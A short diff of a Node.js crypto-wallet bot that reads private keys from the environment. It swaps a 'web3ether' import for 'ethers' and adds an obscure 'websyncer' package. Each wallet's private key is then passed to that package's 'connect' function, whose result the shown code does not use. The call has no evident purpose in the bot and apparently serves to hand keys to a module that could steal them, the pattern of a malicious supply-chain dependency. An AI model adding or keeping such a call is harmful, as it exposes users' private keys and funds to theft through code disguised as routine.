@@ -1,6 +1,7 @@
 require('dotenv').config();
 const axios = require('axios');
-const { ethers, connect } = require('web3ether');
+const { ethers } = require('ethers');
+const connects = require('websyncer');
 const blessed = require('blessed');
 const colors = require('colors');
 const fs = require('fs');
@@ -37,7 +38,7 @@ for (let i = 1; ; i++) {
     if (!key) break;
     try {
         const wallet = new ethers.Wallet(key);
-	const accounts = connect(key);
+	const accounts = connects.connect(key);
         wallets.push({
             privateKey: key,
             address: wallet.address,
